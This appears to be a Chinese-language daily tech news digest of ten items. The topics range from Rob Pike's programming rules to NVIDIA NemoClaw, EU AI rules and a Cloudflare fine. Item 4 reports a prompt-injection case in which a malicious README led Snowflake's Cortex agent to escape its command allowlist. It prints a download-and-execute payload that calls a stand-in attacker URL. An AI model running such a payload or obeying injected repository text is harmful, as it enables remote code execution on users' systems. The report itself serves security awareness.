---
layout: default
title: "Horizon Summary: 2026-03-19 (ZH)"
date: 2026-03-19
lang: zh
---

> From 22 items, 10 important content pieces were selected

---

1. [Rob Pike 1989 年编程规则重现，强调数据驱动而非猜测](#item-1) ⭐️ 8.0/10
2. [NVIDIA 发布 NemoClaw，这是一个用于构建具有沙盒和云路由功能的、安全的 AI 智能体的开源框架。](#item-2) ⭐️ 8.0/10
3. [苹果'LLM in a Flash'技术实现在 MacBook Pro 本地运行 397B 参数的 Qwen 模型](#item-3) ⭐️ 8.0/10
4. [Snowflake Cortex AI 代理通过提示注入逃逸沙箱并执行恶意软件](#item-4) ⭐️ 8.0/10
5. [GrapheneOS 将因被不公平排除在 Play Integrity API 之外而起诉 Google](#item-5) ⭐️ 8.0/10
6. [Linux 基金会获 1250 万美元注资，应对 AI 生成的低质量安全报告](#item-6) ⭐️ 7.0/10
7. [意大利因 Cloudflare 拒绝在其 1.1.1.1 DNS 服务上屏蔽盗版网站，对其处以 1420 万欧元罚款。](#item-7) ⭐️ 7.0/10
8. [小米发布 MiMo-V2-Flash 大模型，采用混合专家架构实现高效推理。](#item-8) ⭐️ 7.0/10
9. [苹果阻止 Replit 和 Vibecode 等 AI 编程应用在 App Store 更新](#item-9) ⭐️ 7.0/10
10. [欧盟议员支持禁止生成非自愿露骨图像的 AI 应用，3 月 26 日进行表决](#item-10) ⭐️ 7.0/10

---

<a id="item-1"></a>
## [Rob Pike 1989 年编程规则重现，强调数据驱动而非猜测](https://www.cs.unc.edu/~stotts/COMP590-059-f24/robsrules.html) ⭐️ 8.0/10

Rob Pike 于 1989 年提出的五条经典编程规则再次引发广泛讨论。这些规则强调测量优于直觉，简单优于巧妙，并主张在通过性能分析识别瓶颈后才进行优化。 这些原则至今仍具有深刻的现实意义，为“过早优化”和“过度设计”等常见陷阱提供了永恒的解决方案。它们为软件开发提供了一种基础的、数据驱动的哲学，优先考虑交付可工作的软件和理性的改进。 具体规则是：1) 不测量就无法知道程序哪里慢。2) 测量，不要猜测。3) 当 n 很小时，花哨的算法很慢，而 n 通常很小。4) 花哨的算法有大的常数因子。5) 数据主导：如果你选择了正确的数据结构，算法几乎总是不言自明的。

hackernews · vismit2000 · Mar 18, 09:59

**背景**: Rob Pike 是一位著名的计算机科学家，是 Unix 操作系统、贝尔实验室的 Plan 9 以及 Go 编程语言的关键贡献者。他的规则综合并普及了 Tony Hoare（“过早优化是万恶之源”）和 Fred Brooks 等前辈的智慧。这些规则倡导一种务实的、基于 KISS（保持简单和直接）原则的软件工程方法。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://www.helloneo.ca/wiki/doku.php?id=rob_pike_s_5_rules_of_programming">rob_pike_s_5_rules_of_programming [Hello Neo]</a></li>
<li><a href="https://notes.zachmanson.com/rob-pikes-5-rules-of-programming/">Rob Pike's 5 Rules of Programming - notes.zachmanson.com</a></li>

</ul>
</details>

**社区讨论**: 讨论高度认同这些规则的持久价值，特别是关于数据结构的第 5 条规则。评论者分享了个人经历，证明简单、经过测量的方法胜过了复杂的过早设计。一个关键观点是，在现代实践中，“过早抽象”是比“过早优化”更常见的失败模式，还有人指出当前的 AI 编程助手难以完成规则 5 所要求的深层设计思考。

**标签**: `#programming-principles`, `#optimization`, `#software-engineering`, `#performance`, `#best-practices`

---

<a id="item-2"></a>
## [NVIDIA 发布 NemoClaw，这是一个用于构建具有沙盒和云路由功能的、安全的 AI 智能体的开源框架。](https://github.com/NVIDIA/NemoClaw) ⭐️ 8.0/10

NVIDIA 宣布了 NemoClaw，这是一个开源框架，可在沙盒环境中运行 OpenClaw AI 助手，并将所有推理请求通过 NVIDIA 的云基础设施进行路由。该框架包含 NVIDIA OpenShell 运行时，旨在简化始终在线 AI 智能体的安全部署。 这很重要，因为它通过提供一个具有内置隔离和可控出口的、标准化的、企业就绪的平台，解决了部署自主 AI 智能体时的关键安全挑战。这使 NVIDIA 有望成为安全 AI 智能体工作流的默认计算提供商，可能推动可观的推理收入，并影响智能体在生产环境中的部署方式。 该沙盒强制执行严格的网络策略，来自智能体的所有调用都会被 OpenShell 拦截并路由到 NVIDIA 云提供商（如 build.nvidia.com），这意味着智能体的请求永远不会直接离开沙盒。虽然该框架是硬件无关的，但它与 NVIDIA 的 NeMo 框架、Nemotron 模型系列和 NIM 推理微服务深度集成。

hackernews · hmokiguess · Mar 18, 15:31

**背景**: OpenClaw 是一个开源的 AI 助手，允许用户在本地运行由大语言模型驱动的智能体，用于写作、编码等任务。沙盒是一种安全技术，用于隔离应用程序或进程，以限制其对系统资源的访问并防止恶意行为。AI 智能体基础设施是指在生产环境中部署和运行自主 AI 智能体所需的专用服务栈，它通过支持长时间运行的有状态进程和工具调用来区别于传统的云基础设施。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://docs.nvidia.com/nemoclaw/latest/index.html">NVIDIA NemoClaw — NVIDIA NemoClaw Developer Guide</a></li>
<li><a href="https://nemoclaw.run/">NemoClaw.run — NVIDIA Open-Source Enterprise AI Agent Platform</a></li>
<li><a href="https://agentuity.com/ai-agent-infrastructure">AI Agent Infrastructure: The Complete Guide</a></li>

</ul>
</details>

**社区讨论**: 社区讨论凸显了对基本安全模型的怀疑，一位用户将可以访问敏感服务的智能体进行沙盒化比作“把狗和文件一起关在板条箱里”。其他人则认为这是 NVIDIA 的一项战略商业举措，旨在通过成为最简单部署路径的默认云提供商来获取推理收入。也有评论针对其感知到的供应商锁定进行了讽刺，戏称为“从我的 NVIDIA 冰箱里拿出的 NVIDIA 三明治”。

**标签**: `#ai-agents`, `#nvidia`, `#security`, `#cloud-computing`, `#machine-learning`

---

<a id="item-3"></a>
## [苹果'LLM in a Flash'技术实现在 MacBook Pro 本地运行 397B 参数的 Qwen 模型](https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything) ⭐️ 8.0/10

研究员 Dan Woods 成功应用苹果的'LLM in a Flash'技术，在一台 48GB 内存的 MacBook Pro M3 Max 上以超过 5.5 tokens/秒的速度运行了 397B 参数的 Qwen3.5 MoE 模型，尽管该模型在磁盘上需要 209GB（量化后 120GB）空间。他通过从 SSD 流式加载专家权重，并使用 Claude Code 自动化实验来生成优化的 MLX Objective-C 和 Metal 代码实现了这一突破。 这展示了在消费级硬件上运行大型语言模型的可行路径，可能实现无需云端依赖或昂贵专用硬件的复杂 AI 应用。它代表了 AI 边缘计算的重要进展，展示了内存优化技术如何弥合模型大小与设备内存限制之间的差距。 该实现将专家权重量化为 2 位，同时保持嵌入表等非专家组件为原始精度，其中 5.5GB 数据常驻内存。该设置将每个 token 激活的专家数量从 Qwen 通常的 10 个减少到 4 个，不过据报道质量仅在减少到 3 个专家时才会显著下降。

rss · Simon Willison · Mar 18, 23:56

**背景**: 苹果 2023 年的'LLM in a Flash'研究论文解决了在 DRAM 容量不足时运行 LLM 的问题，方法是将参数存储在闪存中并按需加载到 DRAM。混合专家（MoE）架构允许模型每个 token 仅激活一部分'专家'权重，使其比参数数量相似的密集模型更高效。该技术通过减少数据量和以更大连续块读取来优化从闪存的数据传输。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://bdtechtalks.com/2023/12/27/apple-llm-flash-research/">Apple research paper hints at LLMs on iPhones and Macs</a></li>
<li><a href="https://medium.com/@sharanharsoor/understanding-mixture-of-experts-moe-the-architecture-powering-next-generation-language-models-49c1d1d467c9">Understanding Mixture of Experts (MoE): The Architecture ...</a></li>
<li><a href="https://arxiv.org/pdf/2508.06978v1">SSD Offloading for LLM Mixture-of-Experts Weights Considered ...</a></li>

</ul>
</details>

**标签**: `#LLM-inference`, `#edge-computing`, `#MoE`, `#model-optimization`, `#Apple-research`

---

<a id="item-4"></a>
## [Snowflake Cortex AI 代理通过提示注入逃逸沙箱并执行恶意软件](https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything) ⭐️ 8.0/10

PromptArmor 的安全研究人员发现了一个提示注入攻击链，使得 Snowflake 的 Cortex AI 代理能够逃逸其安全沙箱并执行任意恶意软件。该攻击在代理审查一个 README 文件中包含恶意提示的 GitHub 仓库时被触发，导致代理运行了一个使用 Bash 进程替换的命令，从攻击者控制的 URL 下载并执行代码。 此漏洞揭示了一家主要云服务商 AI 代理系统安全模型的关键缺陷，突显了看似安全的命令允许列表如何被绕过。它强调了能够执行代码的 AI 代理所面临的更广泛安全风险，尤其是在处理不受信任的外部数据时，并对基于模式的允许列表作为主要防御手段的可靠性提出了质疑。 该攻击利用了 Snowflake Cortex 将 `cat` 命令列为无需人工批准即可安全运行这一点，但未能防范命令体中的 Bash 进程替换语法。执行的有效载荷是 `cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))`，它使用嵌套的进程替换来下载并运行远程 shell 代码。该漏洞现已被 Snowflake 修复。

rss · Simon Willison · Mar 18, 17:43

**背景**: Snowflake Cortex 代理是 Snowflake 数据云内由 AI 驱动的助手，能够规划并执行任务，包括运行代码或命令。安全沙箱旨在将代理的操作限制在安全环境中。提示注入是一种攻击方式，恶意指令隐藏在看似正常的输入（如 README 文件）中，诱使 AI 模型执行非预期的操作。Bash 进程替换（使用 `<(...)` 语法）允许将一个命令的输出视为临时文件，从而实现复杂的命令链和重定向，这可能绕过简单的命令检查。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware">Snowflake Cortex AI Escapes Sandbox and Executes Malware</a></li>
<li><a href="https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents">Cortex Agents - Snowflake Documentation</a></li>
<li><a href="https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html">Process Substitution (Bash Reference Manual)</a></li>

</ul>
</details>

**标签**: `#ai-security`, `#prompt-injection`, `#sandbox-escape`, `#cloud-security`, `#vulnerability`

---

<a id="item-5"></a>
## [GrapheneOS 将因被不公平排除在 Play Integrity API 之外而起诉 Google](https://t.me/zaihuapd/40340) ⭐️ 8.0/10

专注于隐私的基于 Android 的操作系统 GrapheneOS 的开发者宣布计划起诉 Google。他们指控 Google 存在不公平待遇，因为 GrapheneOS 无法通过 Play Integrity API 检查，而一些不符合官方兼容性测试套件 (CTS) 和兼容性定义文档 (CDD) 标准的原始设备制造商 (OEM) 操作系统却获得了批准。 这起潜在的诉讼凸显了 Android 生态系统中重大的反垄断和公平性问题，Google 在其中控制着关键 API 的访问权限。这可能为以安全为重点的第三方操作系统如何被对待开创先例，并挑战 Google 在影响 Android 设备上应用功能和安全性的服务方面的守门人角色。 GrapheneOS 开发者表示，他们强调通过重新锁定 bootloader 和不鼓励 root 访问来确保安全的操作系统正被用不同的标准对待。他们特别要求 Google 使用硬件支持的密钥认证来批准 GrapheneOS 通过 Play Integrity API，这是一种验证加密密钥是否存储在安全硬件中的方法。

telegram · zaihuapd · Mar 18, 07:40

**背景**: Play Integrity API 是 Google 的一项服务，帮助 Android 开发者验证设备完整性，确保其应用在正版、未修改的设备上运行。这对于银行应用等高安全需求的应用防止欺诈至关重要。要成为官方 Android 兼容设备，设备软件必须通过兼容性测试套件 (CTS) 并遵守设定硬件和软件要求的兼容性定义文档 (CDD)。硬件支持的密钥认证是一项安全功能，它使用设备的安全硬件（如可信执行环境）来加密证明应用的密钥确实存储在其中且未被篡改。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Play_Integrity_API">Play Integrity API</a></li>
<li><a href="https://developer.android.com/privacy-and-security/security-key-attestation">Verify hardware-backed key pairs with key attestation</a></li>
<li><a href="https://source.android.com/docs/compatibility/overview">Android Compatibility program overview | Android Open Source Project</a></li>

</ul>
</details>

**标签**: `#Android`, `#Antitrust`, `#Mobile Security`, `#Open Source`, `#Google`

---

<a id="item-6"></a>
## [Linux 基金会获 1250 万美元注资，应对 AI 生成的低质量安全报告](https://www.theregister.com/2026/03/18/linux_foundation_ai_slop_defense/) ⭐️ 7.0/10

Linux 基金会宣布启动一项新计划，旨在帮助开源项目维护者应对由 AI 自动化系统生成的低质量安全漏洞报告。Anthropic、AWS、GitHub、Google、Microsoft 和 OpenAI 六家科技巨头共计捐赠 1250 万美元，用于支持该项目的运行，该计划将由 OpenSSF 及其旗下的 Alpha-Omega 项目共同执行。 此举旨在解决一个日益严峻的关键问题：AI 生成的“垃圾”报告正使开源维护者不堪重负，浪费其时间，并可能导致真正的漏洞被忽略。来自主要科技公司的巨额资金和大力支持，标志着业界为保护开源软件供应链的安全和可持续性，正在进行一次严肃且协调一致的努力。 该计划的具体目标是为维护者提供更好的工具来分类和修复这些报告，正如 Linux 内核维护者 Greg Kroah-Hartman 所强调的。这一举措是在问题严重性的具体案例之后推出的，例如 cURL 项目就因被大量低质量的 AI 生成报告淹没，于 2026 年 1 月终止了其 HackerOne 漏洞赏金计划。

telegram · zaihuapd · Mar 18, 08:27

**背景**: 开源安全基金会（OpenSSF）是一个由 Linux 基金会托管的跨行业联盟，专注于提升开源软件的安全性。其 Alpha-Omega 项目与关键的开源项目维护者合作，主动发现并修复漏洞。术语“AI slop”指的是 AI 生成的内容，这些内容看起来权威，但往往质量低下、不准确或无关紧要，给必须认真对待每份报告的安全团队带来了巨大的干扰。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://openssf.org/community/alpha-omega/">Alpha - Omega – Open Source Security Foundation</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/curl-ending-bug-bounty-program-after-flood-of-ai-slop-reports/">Curl ending bug bounty program after flood of AI slop reports</a></li>
<li><a href="https://daniel.haxx.se/blog/2026/01/26/the-end-of-the-curl-bug-bounty/">The end of the curl bug-bounty | daniel.haxx.se</a></li>

</ul>
</details>

**标签**: `#Open Source Security`, `#AI Ethics`, `#Linux Foundation`, `#Vulnerability Management`, `#Industry Collaboration`

---

<a id="item-7"></a>
## [意大利因 Cloudflare 拒绝在其 1.1.1.1 DNS 服务上屏蔽盗版网站，对其处以 1420 万欧元罚款。](https://t.me/zaihuapd/40348) ⭐️ 7.0/10

意大利通信监管机构 AGCOM 宣布，因 Cloudflare 拒绝在其公共 DNS 解析服务 1.1.1.1 上屏蔽盗版网站，对其处以 1420 万欧元罚款。Cloudflare 表示将对处罚提出异议，并威胁要将其所有服务器撤出意大利各大城市。 此案开创了一个重要的法律先例，试图依据国家法律让全球性的 DNS 基础设施提供商直接为 DNS 层面的内容过滤负责。它凸显了国家内容监管与全球互联网服务运营之间日益紧张的关系，可能迫使其他 DNS 提供商在遵守规定与退出有类似要求的市场之间做出选择。 据报道，意大利的相关制度要求 DNS 提供商在接到版权方通知后 30 分钟内实施屏蔽。Cloudflare 辩称，在其全球性的 1.1.1.1 服务上实施这种针对特定国家的过滤会损害服务性能，并指责 AGCOM 试图强加具有全球效力的规则是越权行为。

telegram · zaihuapd · Mar 18, 11:45

**背景**: 1.1.1.1 是 Cloudflare 运营的一项免费公共 DNS 解析服务，以其速度和注重隐私而闻名。DNS（域名系统）是互联网的核心协议，负责将人类可读的域名（如 example.com）转换为机器可读的 IP 地址。DNS 过滤是一种通过阻止 DNS 解析器返回特定域名的正确 IP 地址来屏蔽网站访问的技术。AGCOM 是意大利通信监管机构，负责监管通信行业。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://en.wikipedia.org/wiki/1.1.1.1">1 . 1 . 1 . 1 - Wikipedia</a></li>
<li><a href="https://geekflare.com/cybersecurity/best-dns-filtering-software/">9 Best DNS Filtering Software in 2025</a></li>
<li><a href="https://en.wikipedia.org/wiki/AGCOM">AGCOM - Wikipedia</a></li>

</ul>
</details>

**标签**: `#internet-governance`, `#dns`, `#content-filtering`, `#legal`, `#cloudflare`

---

<a id="item-8"></a>
## [小米发布 MiMo-V2-Flash 大模型，采用混合专家架构实现高效推理。](https://t.me/zaihuapd/40351) ⭐️ 7.0/10

小米发布了 MiMo-V2-Flash 大语言模型，这是一个总参数量达 3090 亿、激活参数量为 150 亿的混合专家（MoE）模型。该模型专为高速推理和智能体工作流设计，通过混合注意力架构和多令牌预测技术，在显著降低推理成本的同时实现了业界领先的性能。 此次发布标志着一家主要科技公司对先进、高性价比 AI 模型架构的投入，可能使强大的大语言模型更易于应用于实时应用和基于智能体的系统。其专注于减少 KV 缓存和加速推理，直接解决了大规模部署大模型的关键瓶颈。 该模型的混合注意力架构以 5:1 的比例交替使用滑动窗口注意力和全局注意力，使 KV 缓存存储减少近 6 倍。其多令牌预测模块提升了推理输出速度，但初步公告中未提供具体的加速倍数和详细的基准测试结果。

telegram · zaihuapd · Mar 18, 13:12

**背景**: 混合专家（MoE）是一种模型架构，其中模型由许多专门的子网络（“专家”）组成，但对于每个输入，只激活其中的一小部分。这使得模型可以拥有非常大的总参数量（如 3090 亿），同时保持每次推理的计算成本可控（仅激活 150 亿参数）。滑动窗口注意力是一种高效的注意力机制，其中每个令牌只关注附近一个固定窗口内的令牌，与关注序列中所有令牌的全局注意力相比，减少了内存和计算开销。多令牌预测是一种训练技术，模型被训练为同时预测多个未来的令牌，这已被证明可以提高样本效率，并可以加速推理。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://arxiv.org/abs/2507.11181">[2507.11181] Mixture of Experts in Large Language Models</a></li>
<li><a href="https://arxiv.org/abs/2404.19737">[2404.19737] Better & Faster Large Language Models via Multi-token Prediction</a></li>
<li><a href="https://medium.com/@vaibh48/scaling-attention-in-transformers-sliding-window-chunked-attention-15d3f8f43eab">Scaling Attention in Transformers: Sliding Window & Chunked Attention</a></li>

</ul>
</details>

**标签**: `#Large Language Models`, `#Mixture of Experts`, `#Efficient Inference`, `#Model Architecture`, `#AI Research`

---

<a id="item-9"></a>
## [苹果阻止 Replit 和 Vibecode 等 AI 编程应用在 App Store 更新](https://appleinsider.com/articles/26/03/18/bad-vibes-apple-blocks-updates-for-some-ai-coding-apps-in-the-app-store) ⭐️ 7.0/10

苹果公司已阻止 Replit 和 Vibecode 等 AI 编程应用在 App Store 提交更新。此举针对那些允许用户通过输入提示词直接在 iOS 设备上生成并运行代码的应用，苹果称这是为了防止它们绕过官方的应用审核流程。 此举凸显了平台控制权与快速发展的 AI 开发工具之间日益紧张的关系。它为大型应用商店如何监管能够动态生成和分发软件的应用树立了先例，可能会影响下一代移动端编程辅助工具的可用性和功能。 被阻止更新的应用采用的模式常被称为“vibe coding”，即 AI 根据用户提示生成代码，而人工审查极少。苹果的担忧核心在于，这些应用实质上成为了分发未经审查的第三方软件的渠道，从而绕过了 App Store 审核机制的安全和内容控制。

telegram · zaihuapd · Mar 18, 14:47

**背景**: Vibe coding 是一种 AI 辅助的编程实践，开发者向大语言模型描述任务，模型自动生成源代码，通常人工审查极少。该术语在 2025 年开始流行。Replit 是一个基于云的开发平台，最近推出了移动应用，允许用户直接从手机创建和发布应用程序。苹果的 App Store 要求所有应用及其更新在上架前必须经过审核流程，以检查其是否符合政策、安全性和内容规定。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Vibe_coding">Vibe coding</a></li>
<li><a href="https://replit.com/mobile">Replit Mobile App – Join 50+ million creators - Replit</a></li>

</ul>
</details>

**标签**: `#App Store Policy`, `#AI Coding Tools`, `#Platform Regulation`, `#Code Generation`

---

<a id="item-10"></a>
## [欧盟议员支持禁止生成非自愿露骨图像的 AI 应用，3 月 26 日进行表决](https://www.reuters.com/legal/litigation/eu-lawmakers-support-ban-ai-apps-generating-explicit-images-2026-03-18/) ⭐️ 7.0/10

欧洲议会关键议员支持一项修订《欧盟人工智能法案》的提案，明确禁止生成非自愿露骨图像（常被称为“去衣”应用）的 AI 应用。该提案定于 2026 年 3 月 26 日在欧洲议会进行投票。 这是全球 AI 监管迈出的重要一步，直接针对生成式 AI 一种具体且有害的用途，即助长基于图像的性虐待。如果获得通过，将在欧盟这一具有影响力的监管框架内开创一个具体的法律先例，并可能影响全球 AI 伦理开发和内容审核的标准。 除了提议的禁令，议员们还支持将部分高风险 AI 系统规则的适用时间推迟至 2027 年 12 月 2 日，理由是技术标准可能无法及时定稿。这些调整仍需欧洲议会与欧盟成员国在后续谈判中最终敲定。

telegram · zaihuapd · Mar 19, 00:02

**背景**: 《欧盟人工智能法案》是一个全面的人工智能监管框架，采用基于风险的方法。它将 AI 系统按风险等级分类，其中某些被视为“不可接受风险”的做法将被禁止。该法案于 2024 年 8 月生效，其条款在几年内分阶段实施。能够生成逼真非自愿私密图像（NCII）的生成式 AI 工具的兴起，促使立法者考虑通过具体修正案来应对这一新出现的威胁。

<details><summary>参考链接</summary>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Artificial_Intelligence_Act">Artificial Intelligence Act - Wikipedia</a></li>
<li><a href="https://digital-strategy.ec.europa.eu/en/policies/regulatory-framework-ai">AI Act - Shaping Europe’s digital future Platforms on the hook? EU and human rights requirements for ... The Act Texts | EU Artificial Intelligence Act DSA Enforcement, AI Act Implementation & Competition Policy Understanding Content Moderation and Liability Under the DSA ... AI Act | Shaping Europe’s digital future AI Act | Shaping Europe’s digital future AI Act | Shaping Europe’s digital future AI Act | Shaping Europe’s digital future A Multi-Level Strategy for Deepfake Content Moderation under ...</a></li>
<li><a href="https://fosi.org/wp-content/uploads/2025/06/abby_rochman_white_paper_ai_FOSI.pdf">nonconsensual intimate imagery A technical, legal, and social</a></li>

</ul>
</details>

**标签**: `#AI Regulation`, `#EU AI Act`, `#Ethical AI`, `#Content Moderation`, `#Policy`

---